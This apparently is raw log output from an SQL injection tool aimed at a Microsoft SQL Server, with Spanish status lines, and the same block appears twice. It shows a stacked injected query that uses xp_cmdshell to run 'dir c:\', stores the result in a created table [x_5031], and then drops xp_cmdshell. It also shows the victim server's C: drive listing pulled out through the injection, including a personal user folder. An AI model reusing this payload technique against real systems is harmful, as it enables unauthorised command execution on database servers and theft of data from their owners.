COMM:   Se creo la tabla: [[x_5031]].
COMM:   Se ejecuto el comando shell: [ 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell].
EXTR:   _volume_serial_number_is_24ca-c152|.
EXTR:   .
EXTR:   _directory_of_c:\|.
EXTR:   .
EXTR:   21/07/2006__04:59p______<dir>__________ca_lic|.
EXTR:   22/01/2007__06:26p______<dir>__________documents_and_settings|.
EXTR:   14/07/2006__09:12p______<dir>__________drv|.
EXTR:   30/08/2006__11:46a______<dir>__________inetpub|.
EXTR:   31/05/2007__06:29p______<dir>__________marcelo|.
EXTR:   31/08/2006__10:00a______<dir>__________program_files|.
EXTR:   19/07/2006__12:55p______<dir>__________sql2ksp3|.
EXTR:   26/07/2006__11:01a______<dir>__________temp|.
EXTR:   11/07/2007__02:58a______<dir>__________winnt|.
EXTR:   21/07/2006__03:26p_________________302_winntagent.log|.
EXTR:   _______________1_file(s)____________302_bytes|.
EXTR:   _______________9_dir(s)___3.701.329.920_bytes_free|.
EXTR:   .
COMM:   Se creo la tabla: [[x_5031]].
COMM:   Se ejecuto el comando shell: [ 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell].
EXTR:   _volume_serial_number_is_24ca-c152|.
EXTR:   .
EXTR:   _directory_of_c:\|.
EXTR:   .
EXTR:   21/07/2006__04:59p______<dir>__________ca_lic|.
EXTR:   22/01/2007__06:26p______<dir>__________documents_and_settings|.
EXTR:   14/07/2006__09:12p______<dir>__________drv|.
EXTR:   30/08/2006__11:46a______<dir>__________inetpub|.
EXTR:   31/05/2007__06:29p______<dir>__________marcelo|.
EXTR:   31/08/2006__10:00a______<dir>__________program_files|.
EXTR:   19/07/2006__12:55p______<dir>__________sql2ksp3|.
EXTR:   26/07/2006__11:01a______<dir>__________temp|.
EXTR:   11/07/2007__02:58a______<dir>__________winnt|.
EXTR:   21/07/2006__03:26p_________________302_winntagent.log|.
EXTR:   _______________1_file(s)____________302_bytes|.
EXTR:   _______________9_dir(s)___3.701.329.920_bytes_free|.
EXTR:   .
